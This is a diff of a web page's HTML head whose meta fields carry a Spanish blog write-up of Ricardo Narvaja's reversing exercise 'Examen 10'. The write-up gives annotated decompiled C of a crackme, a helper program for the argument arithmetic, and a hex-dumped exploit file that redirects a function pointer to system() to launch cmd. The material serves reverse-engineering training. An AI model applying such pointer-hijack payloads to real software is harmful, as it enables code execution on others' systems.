@@ -11,7 +11,7 @@
   <meta property="og:title" content="Ricardo Narvaja: Examen 10 (Ejecutar calculadora no es un bufferoverflow)">
   <meta property="og:description" content="No me funcionaba con wine en linux porque verifica si argc == 2 y si ejecutás wine EXAMEN_10.exe 49 el argc vale 3, así que tuve que ejecutar el exploit en windows. En linux en vez de usar calc uso cmd porque calc no está disponible a nivel global.
 El código que me generó el ida con algunas modificaciones
-_DWORD *__thiscall this_106(_DWORD *this) { this[106] = &#34;A ejecutar la calculadora de nuevo.">
+_DWORD *__thiscall this_106(_DWORD *this) { this[106] = &#34;A ejecutar la calculadora de nuevo...\n&#34;; return this; } int __cdecl check2(char *Destination) { strcat(Destination, *(Destination &#43; 106)); // Tenemos que hacer que la longitud de Destination valga 56 ya tenemos 38 bytes de la cadena &#34;A ejecutar la calculadora de nuevo...\n&#34; y ahora tenemos que hacer que Destination tenga 18. 18&#43;38=56. // Para lograr eso tenemos que agregar un 0 en la posición 18 porque strcpy copia hasta donde hay un 0. // Voy a ejecutar cmd porque wine no tiene calc.exe if ( strlen(Destination) == 56 ) { if ( Destination[4] == &#39;I&#39; ) (*(Destination &#43; 52))(Destination &#43; 254); if ( Destination[4] == &#39;P&#39; ) (*(Destination &#43; 53))(Destination &#43; 254); if ( Destination[4] == &#39;Q&#39; ) // Este queremos que se ejecute porque en Destination[54] está el puntero a system y Destination[254] es igual a Buffer[30] // Esto es lo mismo que system(Buffer[30]) (*(Destination &#43; 54))(Destination &#43; 254); if ( Destination[4] == &#39;R&#39; ) (*(Destination &#43; 55))(Destination &#43; 254); } return 0; } int __cdecl check(char *Destination, int a2) { // Acá le resta &#39;1&#39; al puntero a system, vamos a ver que significa 1 en hexa. // 1 en hexadecimal = 31 // Entonces tenemos que hacer que v12 valga 49, no sé bien por qué // system&#43;49-&#39;1&#39; = system Destination[54] = a2 - &#39;1&#39;; check2(Destination); return 0; } int __cdecl main(int argc, const char **argv, const char **envp) { char Destination[204]; // [esp&#43;0h] [ebp-1B4h] BYREF FILE *Stream; // [esp&#43;CCh] [ebp-E8h] int (*imprimir)(const char *const, ...); // [esp&#43;D0h] [ebp-E4h] int (*v7)(const char *const, ...); // [esp&#43;D4h] [ebp-E0h] int (*v8)(const char *const, ...); // [esp&#43;D8h] [ebp-DCh] int (*v9)(const char *const, ...); // [esp&#43;DCh] [ebp-D8h] char Buffer[200]; // [esp&#43;E0h] [ebp-D4h] BYREF const char *v11; // [esp&#43;1A8h] [ebp-Ch] int v12; // [esp&#43;1ACh] [ebp-8h] int v13; // [esp&#43;1B0h] [ebp-4h] this_106(Destination); imprimir = printf; v7 = printf; v8 = printf; v9 = printf; printf(v11); v13 = printf; memset(Buffer, 0, sizeof(Buffer)); memset(Destination, 0, 200u); // Carga el contenido del archivo en Stream Stream = fopen(&#34;example.txt&#34;, &#34;rb&#34;); if ( !Stream ) { imprimir(&#34;No se puede leer el archivo bye bye \n&#34;); exit(1); } // De stream copia 200 bytes a Buffer fread(Buffer, 200u, 1u, Stream); // De buffer lo copia a Destination strcpy(Destination, Buffer); // Si hay un argumentos if ( argc == 2 ) { // Transforma a entero el 2do argumento // v12 tiene que valer 31 entonces. v12 = atoi(argv[1]); // Acá suma el puntero a system con v12, no necesitamos v12 sólo queremos el puntero a system. // v13 = system &#43; 49 v13 = system &#43; v12; } check(Destination, v13); imprimir(&#34;\n&#34;); // Buffer[30] = Destination[254] imprimir(&amp;Buffer[30]); return 0; } Con este código me dí cuenta que tenía que pasarle 49 como argumento: #include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;stdlib.h&gt; int main(int argc, char *argv[]){ // a = 61 // 1 = 31 printf(&#34;atoi(%s): %d\n&#34;,argv[1],atoi(argv[1])); printf (&#34;argc: %d\n&#34;,argc); char a = &#39;a&#39; - &#39;1&#39; &#43; atoi(argv[1]); printf(&#34;a = 61, 1 = 31\n&#34;); printf(&#34;&#39;%c&#39;-&#39;1&#39;&#43;atoi(%s): %x\n&#34;,&#39;a&#39;,argv[1],a); return 0; } Exploit 00000000: 5151 5151 5151 5151 5151 5151 5151 5151 QQQQQQQQQQQQQQQQ 00000010: 5100 5151 5151 5151 5151 5151 5151 636d Q.QQQQQQQQQQQQcm 00000020: 64 d Es muy parecido al otro sólo que verifica la cantidad de argumentos y tiene un puntero a system que le resta ‘1’ en char y tenés que sumarle 49 para recuperar la dirección del puntero a system.">
   <meta property="og:locale" content="es_es">
   <meta property="og:type" content="article">
     <meta property="article:section" content="post">
@@ -27,7 +27,7 @@ _DWORD *__thiscall this_106(_DWORD *this) { this[106] = &#34;A ejecutar la calcu
   <meta itemprop="name" content="Ricardo Narvaja: Examen 10 (Ejecutar calculadora no es un bufferoverflow)">
   <meta itemprop="description" content="No me funcionaba con wine en linux porque verifica si argc == 2 y si ejecutás wine EXAMEN_10.exe 49 el argc vale 3, así que tuve que ejecutar el exploit en windows. En linux en vez de usar calc uso cmd porque calc no está disponible a nivel global.
 El código que me generó el ida con algunas modificaciones
-_DWORD *__thiscall this_106(_DWORD *this) { this[106] = &#34;A ejecutar la calculadora de nuevo.">
+_DWORD *__thiscall this_106(_DWORD *this) { this[106] = &#34;A ejecutar la calculadora de nuevo...\n&#34;; return this; } int __cdecl check2(char *Destination) { strcat(Destination, *(Destination &#43; 106)); // Tenemos que hacer que la longitud de Destination valga 56 ya tenemos 38 bytes de la cadena &#34;A ejecutar la calculadora de nuevo...\n&#34; y ahora tenemos que hacer que Destination tenga 18. 18&#43;38=56. // Para lograr eso tenemos que agregar un 0 en la posición 18 porque strcpy copia hasta donde hay un 0. // Voy a ejecutar cmd porque wine no tiene calc.exe if ( strlen(Destination) == 56 ) { if ( Destination[4] == &#39;I&#39; ) (*(Destination &#43; 52))(Destination &#43; 254); if ( Destination[4] == &#39;P&#39; ) (*(Destination &#43; 53))(Destination &#43; 254); if ( Destination[4] == &#39;Q&#39; ) // Este queremos que se ejecute porque en Destination[54] está el puntero a system y Destination[254] es igual a Buffer[30] // Esto es lo mismo que system(Buffer[30]) (*(Destination &#43; 54))(Destination &#43; 254); if ( Destination[4] == &#39;R&#39; ) (*(Destination &#43; 55))(Destination &#43; 254); } return 0; } int __cdecl check(char *Destination, int a2) { // Acá le resta &#39;1&#39; al puntero a system, vamos a ver que significa 1 en hexa. // 1 en hexadecimal = 31 // Entonces tenemos que hacer que v12 valga 49, no sé bien por qué // system&#43;49-&#39;1&#39; = system Destination[54] = a2 - &#39;1&#39;; check2(Destination); return 0; } int __cdecl main(int argc, const char **argv, const char **envp) { char Destination[204]; // [esp&#43;0h] [ebp-1B4h] BYREF FILE *Stream; // [esp&#43;CCh] [ebp-E8h] int (*imprimir)(const char *const, ...); // [esp&#43;D0h] [ebp-E4h] int (*v7)(const char *const, ...); // [esp&#43;D4h] [ebp-E0h] int (*v8)(const char *const, ...); // [esp&#43;D8h] [ebp-DCh] int (*v9)(const char *const, ...); // [esp&#43;DCh] [ebp-D8h] char Buffer[200]; // [esp&#43;E0h] [ebp-D4h] BYREF const char *v11; // [esp&#43;1A8h] [ebp-Ch] int v12; // [esp&#43;1ACh] [ebp-8h] int v13; // [esp&#43;1B0h] [ebp-4h] this_106(Destination); imprimir = printf; v7 = printf; v8 = printf; v9 = printf; printf(v11); v13 = printf; memset(Buffer, 0, sizeof(Buffer)); memset(Destination, 0, 200u); // Carga el contenido del archivo en Stream Stream = fopen(&#34;example.txt&#34;, &#34;rb&#34;); if ( !Stream ) { imprimir(&#34;No se puede leer el archivo bye bye \n&#34;); exit(1); } // De stream copia 200 bytes a Buffer fread(Buffer, 200u, 1u, Stream); // De buffer lo copia a Destination strcpy(Destination, Buffer); // Si hay un argumentos if ( argc == 2 ) { // Transforma a entero el 2do argumento // v12 tiene que valer 31 entonces. v12 = atoi(argv[1]); // Acá suma el puntero a system con v12, no necesitamos v12 sólo queremos el puntero a system. // v13 = system &#43; 49 v13 = system &#43; v12; } check(Destination, v13); imprimir(&#34;\n&#34;); // Buffer[30] = Destination[254] imprimir(&amp;Buffer[30]); return 0; } Con este código me dí cuenta que tenía que pasarle 49 como argumento: #include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;stdlib.h&gt; int main(int argc, char *argv[]){ // a = 61 // 1 = 31 printf(&#34;atoi(%s): %d\n&#34;,argv[1],atoi(argv[1])); printf (&#34;argc: %d\n&#34;,argc); char a = &#39;a&#39; - &#39;1&#39; &#43; atoi(argv[1]); printf(&#34;a = 61, 1 = 31\n&#34;); printf(&#34;&#39;%c&#39;-&#39;1&#39;&#43;atoi(%s): %x\n&#34;,&#39;a&#39;,argv[1],a); return 0; } Exploit 00000000: 5151 5151 5151 5151 5151 5151 5151 5151 QQQQQQQQQQQQQQQQ 00000010: 5100 5151 5151 5151 5151 5151 5151 636d Q.QQQQQQQQQQQQcm 00000020: 64 d Es muy parecido al otro sólo que verifica la cantidad de argumentos y tiene un puntero a system que le resta ‘1’ en char y tenés que sumarle 49 para recuperar la dirección del puntero a system.">
   <meta itemprop="datePublished" content="2024-08-26T15:52:16-03:00">
   <meta itemprop="dateModified" content="2024-08-26T15:52:16-03:00">
   <meta itemprop="wordCount" content="623">
@@ -37,7 +37,7 @@ _DWORD *__thiscall this_106(_DWORD *this) { this[106] = &#34;A ejecutar la calcu
   <meta name="twitter:title" content="Ricardo Narvaja: Examen 10 (Ejecutar calculadora no es un bufferoverflow)">
   <meta name="twitter:description" content="No me funcionaba con wine en linux porque verifica si argc == 2 y si ejecutás wine EXAMEN_10.exe 49 el argc vale 3, así que tuve que ejecutar el exploit en windows. En linux en vez de usar calc uso cmd porque calc no está disponible a nivel global.
 El código que me generó el ida con algunas modificaciones
-_DWORD *__thiscall this_106(_DWORD *this) { this[106] = &#34;A ejecutar la calculadora de nuevo.">
+_DWORD *__thiscall this_106(_DWORD *this) { this[106] = &#34;A ejecutar la calculadora de nuevo...\n&#34;; return this; } int __cdecl check2(char *Destination) { strcat(Destination, *(Destination &#43; 106)); // Tenemos que hacer que la longitud de Destination valga 56 ya tenemos 38 bytes de la cadena &#34;A ejecutar la calculadora de nuevo...\n&#34; y ahora tenemos que hacer que Destination tenga 18. 18&#43;38=56. // Para lograr eso tenemos que agregar un 0 en la posición 18 porque strcpy copia hasta donde hay un 0. // Voy a ejecutar cmd porque wine no tiene calc.exe if ( strlen(Destination) == 56 ) { if ( Destination[4] == &#39;I&#39; ) (*(Destination &#43; 52))(Destination &#43; 254); if ( Destination[4] == &#39;P&#39; ) (*(Destination &#43; 53))(Destination &#43; 254); if ( Destination[4] == &#39;Q&#39; ) // Este queremos que se ejecute porque en Destination[54] está el puntero a system y Destination[254] es igual a Buffer[30] // Esto es lo mismo que system(Buffer[30]) (*(Destination &#43; 54))(Destination &#43; 254); if ( Destination[4] == &#39;R&#39; ) (*(Destination &#43; 55))(Destination &#43; 254); } return 0; } int __cdecl check(char *Destination, int a2) { // Acá le resta &#39;1&#39; al puntero a system, vamos a ver que significa 1 en hexa. // 1 en hexadecimal = 31 // Entonces tenemos que hacer que v12 valga 49, no sé bien por qué // system&#43;49-&#39;1&#39; = system Destination[54] = a2 - &#39;1&#39;; check2(Destination); return 0; } int __cdecl main(int argc, const char **argv, const char **envp) { char Destination[204]; // [esp&#43;0h] [ebp-1B4h] BYREF FILE *Stream; // [esp&#43;CCh] [ebp-E8h] int (*imprimir)(const char *const, ...); // [esp&#43;D0h] [ebp-E4h] int (*v7)(const char *const, ...); // [esp&#43;D4h] [ebp-E0h] int (*v8)(const char *const, ...); // [esp&#43;D8h] [ebp-DCh] int (*v9)(const char *const, ...); // [esp&#43;DCh] [ebp-D8h] char Buffer[200]; // [esp&#43;E0h] [ebp-D4h] BYREF const char *v11; // [esp&#43;1A8h] [ebp-Ch] int v12; // [esp&#43;1ACh] [ebp-8h] int v13; // [esp&#43;1B0h] [ebp-4h] this_106(Destination); imprimir = printf; v7 = printf; v8 = printf; v9 = printf; printf(v11); v13 = printf; memset(Buffer, 0, sizeof(Buffer)); memset(Destination, 0, 200u); // Carga el contenido del archivo en Stream Stream = fopen(&#34;example.txt&#34;, &#34;rb&#34;); if ( !Stream ) { imprimir(&#34;No se puede leer el archivo bye bye \n&#34;); exit(1); } // De stream copia 200 bytes a Buffer fread(Buffer, 200u, 1u, Stream); // De buffer lo copia a Destination strcpy(Destination, Buffer); // Si hay un argumentos if ( argc == 2 ) { // Transforma a entero el 2do argumento // v12 tiene que valer 31 entonces. v12 = atoi(argv[1]); // Acá suma el puntero a system con v12, no necesitamos v12 sólo queremos el puntero a system. // v13 = system &#43; 49 v13 = system &#43; v12; } check(Destination, v13); imprimir(&#34;\n&#34;); // Buffer[30] = Destination[254] imprimir(&amp;Buffer[30]); return 0; } Con este código me dí cuenta que tenía que pasarle 49 como argumento: #include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;stdlib.h&gt; int main(int argc, char *argv[]){ // a = 61 // 1 = 31 printf(&#34;atoi(%s): %d\n&#34;,argv[1],atoi(argv[1])); printf (&#34;argc: %d\n&#34;,argc); char a = &#39;a&#39; - &#39;1&#39; &#43; atoi(argv[1]); printf(&#34;a = 61, 1 = 31\n&#34;); printf(&#34;&#39;%c&#39;-&#39;1&#39;&#43;atoi(%s): %x\n&#34;,&#39;a&#39;,argv[1],a); return 0; } Exploit 00000000: 5151 5151 5151 5151 5151 5151 5151 5151 QQQQQQQQQQQQQQQQ 00000010: 5100 5151 5151 5151 5151 5151 5151 636d Q.QQQQQQQQQQQQcm 00000020: 64 d Es muy parecido al otro sólo que verifica la cantidad de argumentos y tiene un puntero a system que le resta ‘1’ en char y tenés que sumarle 49 para recuperar la dirección del puntero a system.">
 
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
@@ -57,7 +57,122 @@ _DWORD *__thiscall this_106(_DWORD *this) { this[106] = &#34;A ejecutar la calcu
   <meta name="author" content="Imlauer.">
   <meta name="description" content="No me funcionaba con wine en linux porque verifica si argc == 2 y si ejecutás wine EXAMEN_10.exe 49 el argc vale 3, así que tuve que ejecutar el exploit en windows. En linux en vez de usar calc uso cmd porque calc no está disponible a nivel global.
 El código que me generó el ida con algunas modificaciones
-_DWORD *__thiscall this_106(_DWORD *this) { this[106] = &#34;A ejecutar la calculadora de nuevo.">
+
+_DWORD *__thiscall this_106(_DWORD *this)
+{
+  this[106] = &#34;A ejecutar la calculadora de nuevo...\n&#34;;
+  return this;
+}
+
+int __cdecl check2(char *Destination)
+{
+  strcat(Destination, *(Destination &#43; 106));
+  //  Tenemos que hacer que la longitud de Destination valga 56 ya tenemos 38 bytes de la cadena &#34;A ejecutar la calculadora de nuevo...\n&#34; y ahora tenemos que hacer que Destination tenga 18. 18&#43;38=56.
+  // Para lograr eso tenemos que agregar un 0 en la posición 18 porque strcpy copia hasta donde hay un 0.
+
+  // Voy a ejecutar cmd porque wine no tiene calc.exe
+  if ( strlen(Destination) == 56 )
+  {
+    if ( Destination[4] == &#39;I&#39; )
+      (*(Destination &#43; 52))(Destination &#43; 254);
+    if ( Destination[4] == &#39;P&#39; )
+      (*(Destination &#43; 53))(Destination &#43; 254);
+    if ( Destination[4] == &#39;Q&#39; )
+      // Este queremos que se ejecute porque en Destination[54] está el puntero a system y Destination[254] es igual a Buffer[30]
+
+      // Esto es lo mismo que system(Buffer[30])
+      (*(Destination &#43; 54))(Destination &#43; 254);
+
+    if ( Destination[4] == &#39;R&#39; )
+      (*(Destination &#43; 55))(Destination &#43; 254);
+  }
+  return 0;
+}
+
+int __cdecl check(char *Destination, int a2)
+{
+  // Acá le resta &#39;1&#39; al puntero a system, vamos a ver que significa 1 en hexa.
+  // 1 en hexadecimal = 31
+  // Entonces tenemos que hacer que v12 valga 49, no sé bien por qué 
+  // system&#43;49-&#39;1&#39; = system
+  Destination[54] = a2 - &#39;1&#39;;
+  check2(Destination);
+  return 0;
+}
+
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char Destination[204]; // [esp&#43;0h] [ebp-1B4h] BYREF
+  FILE *Stream; // [esp&#43;CCh] [ebp-E8h]
+  int (*imprimir)(const char *const, ...); // [esp&#43;D0h] [ebp-E4h]
+  int (*v7)(const char *const, ...); // [esp&#43;D4h] [ebp-E0h]
+  int (*v8)(const char *const, ...); // [esp&#43;D8h] [ebp-DCh]
+  int (*v9)(const char *const, ...); // [esp&#43;DCh] [ebp-D8h]
+  char Buffer[200]; // [esp&#43;E0h] [ebp-D4h] BYREF
+  const char *v11; // [esp&#43;1A8h] [ebp-Ch]
+  int v12; // [esp&#43;1ACh] [ebp-8h]
+  int v13; // [esp&#43;1B0h] [ebp-4h]
+
+  this_106(Destination);
+  imprimir = printf;
+  v7 = printf;
+  v8 = printf;
+  v9 = printf;
+  printf(v11);
+  v13 = printf;
+  memset(Buffer, 0, sizeof(Buffer));
+  memset(Destination, 0, 200u);
+  // Carga el contenido del archivo en Stream
+  Stream = fopen(&#34;example.txt&#34;, &#34;rb&#34;);
+  if ( !Stream )
+  {
+    imprimir(&#34;No se puede leer el archivo bye bye \n&#34;);
+    exit(1);
+  }
+  // De stream copia 200 bytes a Buffer
+  fread(Buffer, 200u, 1u, Stream);
+  // De buffer lo copia a Destination
+  strcpy(Destination, Buffer);
+  // Si hay un argumentos
+  if ( argc == 2 )
+  {
+    // Transforma a entero el 2do argumento
+    // v12 tiene que valer 31 entonces.
+    v12 = atoi(argv[1]);
+    // Acá suma el puntero a system con v12, no necesitamos v12 sólo queremos el puntero a system.
+    // v13 = system &#43; 49
+    v13 = system &#43; v12;
+  }
+  check(Destination, v13);
+  imprimir(&#34;\n&#34;);
+  // Buffer[30] = Destination[254]
+  imprimir(&amp;Buffer[30]);
+  return 0;
+}
+Con este código me dí cuenta que tenía que pasarle 49 como argumento:
+
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdlib.h&gt;
+
+int main(int argc, char *argv[]){
+
+	// a = 61
+	// 1 = 31
+	printf(&#34;atoi(%s): %d\n&#34;,argv[1],atoi(argv[1]));
+
+	printf (&#34;argc: %d\n&#34;,argc);
+	char a = &#39;a&#39; - &#39;1&#39; &#43; atoi(argv[1]);
+
+	printf(&#34;a = 61, 1 = 31\n&#34;);
+	printf(&#34;&#39;%c&#39;-&#39;1&#39;&#43;atoi(%s): %x\n&#34;,&#39;a&#39;,argv[1],a);
+	return 0;
+}
+Exploit
+00000000: 5151 5151 5151 5151 5151 5151 5151 5151  QQQQQQQQQQQQQQQQ
+00000010: 5100 5151 5151 5151 5151 5151 5151 636d  Q.QQQQQQQQQQQQcm
+00000020: 64                                       d
+Es muy parecido al otro sólo que verifica la cantidad de argumentos y tiene un puntero a system que le resta &lsquo;1&rsquo; en char y tenés que sumarle 49 para recuperar la dirección del puntero a system.">
 </head>
 <body><nav class="navbar is-transparent " role="navigation" aria-label="main navigation">
   <div class="navbar-brand">
